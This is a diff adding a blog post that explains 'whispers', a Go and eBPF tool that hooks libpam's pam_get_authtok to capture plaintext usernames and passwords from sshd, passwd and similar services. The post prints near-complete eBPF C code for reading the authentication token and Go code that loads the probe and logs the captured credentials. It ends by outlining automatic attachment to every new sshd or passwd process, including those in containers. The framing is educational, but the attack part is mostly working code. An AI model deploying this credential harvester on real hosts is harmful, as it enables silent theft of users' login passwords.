@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Snooping on libpam (openssh auth, passwd) with Golang and eBPF</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="In the vast and complex landscape of software security, safeguarding sensitive information remains a paramount concern for developers and security professionals …" />
+<meta name="keywords" content="linux, ebpf, golang, hacking, libpam, openssh, passwd" />
+
+
+<link rel="canonical" href="https://www.petermcconnell.com/posts/whispers/" />
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-QJWXPMPB8F"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-QJWXPMPB8F');
+</script>
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/style.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://www.petermcconnell.com/img/theme-colors/pink.png">
+  <link rel="apple-touch-icon" href="https://www.petermcconnell.com/img/theme-colors/pink.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:title" content="Snooping on libpam (openssh auth, passwd) with Golang and eBPF" />
+<meta name="twitter:description" content="In the vast and complex landscape of software security, safeguarding sensitive information remains a paramount concern for developers and security professionals alike. Among the myriad of challenges, securely managing and protecting credentials during authentication processes stands out as a critical vulnerability point. Traditional security measures often fall short in providing real-time insights into how credentials are handled and potentially exposed within applications, especially those relying on widely used authentication frameworks like PAM (Pluggable Authentication Modules)." />
+  
+<meta name="twitter:site" content="@PeteMcConnell_" />
+  
+<meta name="twitter:creator" content="Peter McConnell" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Snooping on libpam (openssh auth, passwd) with Golang and eBPF">
+<meta property="og:description" content="In the vast and complex landscape of software security, safeguarding sensitive information remains a paramount concern for developers and security professionals alike. Among the myriad of challenges, securely managing and protecting credentials during authentication processes stands out as a critical vulnerability point. Traditional security measures often fall short in providing real-time insights into how credentials are handled and potentially exposed within applications, especially those relying on widely used authentication frameworks like PAM (Pluggable Authentication Modules)." />
+<meta property="og:url" content="https://www.petermcconnell.com/posts/whispers/" />
+<meta property="og:site_name" content="Peter McConnell :: Ponderings from a Linux Systems engineer" />
+
+  
+  
+  <meta property="og:image" content="https://raw.githubusercontent.com/peter-mcconnell/petermcconnell.com/master/assets/whispers.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-02-18 11:40:02 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="pink">
+
+
+<div class="container headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Peter McConnell
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+        
+          <li><a href="/skills">Skills</a></li>
+        
+      
+      
+        <hr />
+        
+          <li>
+            <a href="https://www.petermcconnell.com/">English</a>
+          </li>
+        
+          <li>
+            <a href="https://www.petermcconnell.com/pt/">Português</a>
+          </li>
+        
+          <li>
+            <a href="https://www.petermcconnell.com/es/">Española</a>
+          </li>
+        
+          <li>
+            <a href="https://www.petermcconnell.com/fr/">Français</a>
+          </li>
+        
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+      <ul class="menu menu--desktop menu--language-selector">
+  <li class="menu__trigger">English&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        <li><a href="https://www.petermcconnell.com/">English</a></li>
+      
+        <li><a href="https://www.petermcconnell.com/pt/">Português</a></li>
+      
+        <li><a href="https://www.petermcconnell.com/es/">Española</a></li>
+      
+        <li><a href="https://www.petermcconnell.com/fr/">Français</a></li>
+      
+    </ul>
+  </li>
+</ul>
+
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+        
+          <li><a href="/skills">Skills</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://www.petermcconnell.com/posts/whispers/">Snooping on libpam (openssh auth, passwd) with Golang and eBPF</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        2024-02-18 ::
+        
+      </time>
+    
+    
+      <span class="post-author">Peter McConnell</span>
+    
+    
+      <span class="post-reading-time">:: 7 min read (1301 words)</span>
+    
+  </div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://www.petermcconnell.com/tags/linux/">linux</a>&nbsp;
+      
+      #<a href="https://www.petermcconnell.com/tags/ebpf/">ebpf</a>&nbsp;
+      
+      #<a href="https://www.petermcconnell.com/tags/golang/">golang</a>&nbsp;
+      
+      #<a href="https://www.petermcconnell.com/tags/hacking/">hacking</a>&nbsp;
+      
+      #<a href="https://www.petermcconnell.com/tags/libpam/">libpam</a>&nbsp;
+      
+    </span>
+  
+  
+  <img src="https://raw.githubusercontent.com/peter-mcconnell/petermcconnell.com/master/assets/whispers.png"
+    class="post-cover"
+    alt="Snooping on libpam (openssh auth, passwd) with Golang and eBPF"
+    title="Cover Image" />
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#developing-the-ebpf-program-for-whispers">Developing the eBPF Program for whispers</a>
+      <ul>
+        <li><a href="#technical-background">Technical Background</a></li>
+        <li><a href="#developing-the-ebpf-program">Developing the eBPF Program</a></li>
+      </ul>
+    </li>
+    <li><a href="#seeing-it-in-action">Seeing it in action</a></li>
+    <li><a href="#improvements">Improvements</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <p>In the vast and complex landscape of software security, safeguarding sensitive information remains a paramount concern for developers and security professionals alike. Among the myriad of challenges, securely managing and protecting credentials during authentication processes stands out as a critical vulnerability point. Traditional security measures often fall short in providing real-time insights into how credentials are handled and potentially exposed within applications, especially those relying on widely used authentication frameworks like PAM (Pluggable Authentication Modules).</p>
+<p>Enter whispers, a groundbreaking tool designed to bridge this gap by leveraging the power of eBPF (Extended Berkeley Packet Filter) technology and the Go programming language. whispers offers a unique window into the authentication process, capturing credentials in real-time as they&rsquo;re passed through libpam — a common library used by essential services such as openssh, passwd, and more. This capability not only shines a light on the unseen aspects of credential management but also serves as an invaluable educational resource for those looking to deepen their understanding of system security dynamics.</p>
+<p>Developed with an emphasis on practicality, whispers embodies a seamless integration between the cutting-edge eBPF technology and Go&rsquo;s robust system programming capabilities. By attaching to specific kernel functions related to authentication, whispers meticulously captures and logs credential usage, providing clear insights into the authentication flow and uncovering potential security vulnerabilities that could be exploited in real-world scenarios.</p>
+<p>whispers is not just a tool; it&rsquo;s a foray into the depths of system-level monitoring and security analysis. Whether you&rsquo;re a seasoned security professional, a system administrator, or a developer keen on enhancing your application&rsquo;s security posture, whispers offers a compelling glimpse into the critical intersection of authentication processes and security monitoring. Join us as we delve into the mechanics, applications, and educational benefits of whispers, illustrating how it stands as a testament to the innovative fusion of eBPF and Go in the service of software security.</p>
+<h2 id="developing-the-ebpf-program-for-whispers">Developing the eBPF Program for whispers<a href="#developing-the-ebpf-program-for-whispers" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>This section provides an in-depth look at the development of the eBPF program for whispers, a tool designed to monitor and capture credentials handled by libpam. By leveraging eBPF, whispers taps into kernel functions related to authentication processes, offering unprecedented insights into credential management and security vulnerabilities.</p>
+<h3 id="technical-background">Technical Background<a href="#technical-background" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>eBPF (Extended Berkeley Packet Filter) is a powerful technology that allows for the dynamic tracing of kernel and user space applications without modifying their source code or requiring prior knowledge of their internal workings. eBPF programs are run by the Linux kernel and can safely access kernel data structures, making them ideal for monitoring, networking, and security applications.
+Setting Up the Development Environment</p>
+<p>Before diving into eBPF program development, ensure your development environment is properly set up with the following tools and libraries:</p>
+<pre><code>LLVM &amp; Clang: For compiling eBPF programs.
+Linux Kernel Headers: Required for eBPF program compilation to access kernel APIs.
+libbpf: A library for loading and interacting with eBPF programs and maps.
+Go toolchain: For the Go-based components of whispers.
+</code></pre>
+<h3 id="developing-the-ebpf-program">Developing the eBPF Program<a href="#developing-the-ebpf-program" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The eBPF program for whispers is designed to attach to the pam_get_authtok function via a uretprobe, capturing credentials as they&rsquo;re processed.
+Key Components</p>
+<pre><code>uretprobe.c: Contains the eBPF code that defines the data structures and logic for capturing and processing credential information from pam_get_authtok.
+</code></pre>
+<h4 id="bpf-code">BPF code<a href="#bpf-code" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>When trying to look up the structure of pam_get_authtok I encountered <a href="https://github.com/citronneur/pamspy">https://github.com/citronneur/pamspy</a> which is where I lifted most of this code from, so credit to them:</p>
+<p>You can see the code in full at <a href="https://github.com/peter-mcconnell/whispers/blob/main/bpf/uretprobe.c">https://github.com/peter-mcconnell/whispers/blob/main/bpf/uretprobe.c</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">...
+
+<span style="color:#75715e">// we need the pam_handle struct so that we can read the data in our BPF program
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> pam_handle
+{
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>authtok;
+  <span style="color:#66d9ef">unsigned</span> caller_is;
+  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>pam_conversation;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>oldauthtok;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>prompt;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>service_name;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>user;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rhost;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ruser;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>tty;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>xdisplay;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>authtok_type;
+  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data;
+  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>env;
+} pam_handle_t;
+
+<span style="color:#75715e">// we&#39;re using a ringbuffer datastructure to share data back to our userspace program
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span>
+{
+  __uint(type, BPF_MAP_TYPE_RINGBUF);
+  __uint(max_entries, <span style="color:#ae81ff">256</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>);
+} rb SEC(<span style="color:#e6db74">&#34;.maps&#34;</span>);
+
+...
+
+SEC(<span style="color:#e6db74">&#34;uretprobe/pam_get_authtok&#34;</span>)
+<span style="color:#66d9ef">int</span> trace_pam_get_authtok(<span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>ctx)
+{
+  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>PT_REGS_PARM1(ctx))
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+
+  pam_handle_t<span style="color:#f92672">*</span> phandle <span style="color:#f92672">=</span> (pam_handle_t<span style="color:#f92672">*</span>)PT_REGS_PARM1(ctx);
+
+  u32 pid <span style="color:#f92672">=</span> bpf_get_current_pid_tgid() <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>;
+
+  u64 password_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  bpf_probe_read(<span style="color:#f92672">&amp;</span>password_addr, <span style="color:#66d9ef">sizeof</span>(password_addr), <span style="color:#f92672">&amp;</span>phandle<span style="color:#f92672">-&gt;</span>authtok);
+
+  u64 username_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  bpf_probe_read(<span style="color:#f92672">&amp;</span>username_addr, <span style="color:#66d9ef">sizeof</span>(username_addr), <span style="color:#f92672">&amp;</span>phandle<span style="color:#f92672">-&gt;</span>user);
+
+  event_t <span style="color:#f92672">*</span>e;
+  e <span style="color:#f92672">=</span> bpf_ringbuf_reserve(<span style="color:#f92672">&amp;</span>rb, <span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>e), <span style="color:#ae81ff">0</span>);
+  <span style="color:#66d9ef">if</span> (e)
+  {
+    e<span style="color:#f92672">-&gt;</span>pid <span style="color:#f92672">=</span> pid;
+    bpf_probe_read(<span style="color:#f92672">&amp;</span>e<span style="color:#f92672">-&gt;</span>password, <span style="color:#66d9ef">sizeof</span>(e<span style="color:#f92672">-&gt;</span>password), (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)password_addr);
+    bpf_probe_read(<span style="color:#f92672">&amp;</span>e<span style="color:#f92672">-&gt;</span>username, <span style="color:#66d9ef">sizeof</span>(e<span style="color:#f92672">-&gt;</span>username), (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)username_addr);
+    bpf_get_current_comm(<span style="color:#f92672">&amp;</span>e<span style="color:#f92672">-&gt;</span>comm, <span style="color:#66d9ef">sizeof</span>(e<span style="color:#f92672">-&gt;</span>comm));
+    bpf_ringbuf_submit(e, <span style="color:#ae81ff">0</span>);
+  }
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+};
+</code></pre></div><p>To handle compiling this code, given we&rsquo;re going to be using Golang we&rsquo;ll define a <code>go generate</code> later which will point to a bash script which will handle compilation.</p>
+<h4 id="golang-code">Golang code<a href="#golang-code" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>This section delves into the Go component of whispers, which serves as the user-space counterpart to the eBPF program. It outlines how to leverage Go to load the eBPF program, attach probes, read from eBPF maps, and process the captured credential data for monitoring and analysis purposes.</p>
+<p>Ensure your Go environment is set up with the necessary dependencies:</p>
+<pre><code>Go (1.21 or newer): Ensure the Go toolchain is installed.
+</code></pre>
+<p>The Go codebase for whispers is structured as follows:</p>
+<pre><code>cmd/: Contains the CLI interface for whispers.
+pkg/config: Defines configuration structures and parsing logic.
+pkg/whispers: Implements the core functionality for loading and interacting with the eBPF program.
+</code></pre>
+<p>Dependencies are defined in <code>go.mod</code> and can be pulled with <code>go mod tidy</code>.</p>
+<p>This article will only touch on the most interesting parts of the code. The source can be read at <a href="https://github.com/peter-mcconnell/whispers/blob/main/pkg/whispers/whispers.go">https://github.com/peter-mcconnell/whispers/blob/main/pkg/whispers/whispers.go</a>.</p>
+<p>We&rsquo;re using cilium ebpf to handle loading our BPF program and interacting with the BPF maps. In the following, <code>bpfObjects</code> and <code>loadBpfObjects</code> are defined in the auto-generated file <code>bpf_x86_bpfel.go</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Listen</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">cfg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">Config</span>) <span style="color:#66d9ef">error</span> {
+    <span style="color:#a6e22e">objs</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">bpfObjects</span>{}
+    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">loadBpfObjects</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">objs</span>, <span style="color:#66d9ef">nil</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+    }
+    <span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">objs</span>.<span style="color:#a6e22e">Close</span>()
+
+    <span style="color:#f92672">...</span>
+}
+</code></pre></div><p>The above snippet demonstrates loading the eBPF program and ensuring it is correctly cleaned up upon termination.</p>
+<p>whispers attaches uretprobes to target functions (e.g., pam_get_authtok) also using the cilium/ebpf library:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#a6e22e">ex</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">OpenExecutable</span>(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">BinPath</span>)
+<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+}
+<span style="color:#a6e22e">up</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ex</span>.<span style="color:#a6e22e">Uretprobe</span>(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">Symbol</span>, <span style="color:#a6e22e">objs</span>.<span style="color:#a6e22e">TracePamGetAuthtok</span>, <span style="color:#66d9ef">nil</span>)
+<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+}
+<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">up</span>.<span style="color:#a6e22e">Close</span>()
+<span style="color:#f92672">...</span>
+</code></pre></div><p>The Go code uses a ring buffer to read events captured by the eBPF program:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#a6e22e">rb</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ringbuf</span>.<span style="color:#a6e22e">NewReader</span>(<span style="color:#a6e22e">objs</span>.<span style="color:#a6e22e">Rb</span>)
+<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+    <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;failed to open ring buffer reader: %v&#34;</span>, <span style="color:#a6e22e">err</span>)
+}
+<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">rb</span>.<span style="color:#a6e22e">Close</span>()
+
+<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>() {
+    <span style="color:#66d9ef">for</span> {
+        <span style="color:#a6e22e">record</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rb</span>.<span style="color:#a6e22e">Read</span>()
+        <span style="color:#f92672">...</span>
+        <span style="color:#a6e22e">event</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">parseEventData</span>(<span style="color:#a6e22e">record</span>.<span style="color:#a6e22e">RawSample</span>)
+        <span style="color:#f92672">...</span>
+    }
+}()
+</code></pre></div><p>After reading events from the ring buffer, whispers processes and logs the captured credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Event: PID: %d, Comm: %s, Username: %s, Password: %s&#34;</span>,
+    <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">Pid</span>,
+    <span style="color:#a6e22e">byteArrayToString</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">Comm</span>[:]),
+    <span style="color:#a6e22e">byteArrayToString</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">Username</span>[:]),
+    <span style="color:#a6e22e">byteArrayToString</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">Password</span>[:]))
+</code></pre></div><h2 id="seeing-it-in-action">Seeing it in action<a href="#seeing-it-in-action" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Included with the repository is a Dockerfile that not only builds <code>whisper</code> but also contains an sshd server ready to go, so that you can play with it immediately. The following is a demonstration of that:</p>
+<p><a href="https://asciinema.org/a/641250"><img src="https://asciinema.org/a/641250.png" alt="asciicast"></a></p>
+<h2 id="improvements">Improvements<a href="#improvements" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>This project was designed to be very simple - specifically I&rsquo;m aiming to give an overview of the tech in a short meetup. As such, it isn&rsquo;t intended to be feature-complete. Namely this project results in a binary whereby you provide the <code>-binPath=/path/to/libpam</code>, however we can automate this attachment with more eBPF.</p>
+<p>This project has used uprobes to trace arguments for a given user-space application. However we can automate the auto-attachment of these probes using kprobes. With kprobes we could filter <code>execve</code> and <code>fork</code> for <code>comm</code>s that we deem to be interesting (e.g. <code>sshd</code>, <code>passwd</code>) and when we get a match, we could run <code>ldd</code> against the <code>/proc/&lt;pid&gt;/exe</code> to see if we can see <code>libpam</code> and attach that way. There are some complexities to consider here such as the namespace for a given process may be different (e.g. for containers). We&rsquo;d likely also want to look at existing processes and attach probes to those also. However, these are all trivial problems to solve. The result being that you could run a single <code>whispers</code> with no targets, that would automatically attach our uprobes whenever a suitable process was started.</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://www.petermcconnell.com/posts/writing-an-xdp-ebpf-program/">
+                <span class="button__text">Building an XDP eBPF Program with C and Golang: A Step-by-Step Guide</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    <div class="links">
+      <a target="_blank" href="https://twitter.com/PeteMcConnell_">twitter</a> |
+      <a target="_blank" href="https://github.com/peter-mcconnell/">github</a> |
+      <a target="_blank" href="https://www.linkedin.com/in/pemcconnell/">linkedin</a>
+      
+        <div class="copyright copyright--user">
+          <span>&copy; Peter McConnell 2023</span>
+      
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
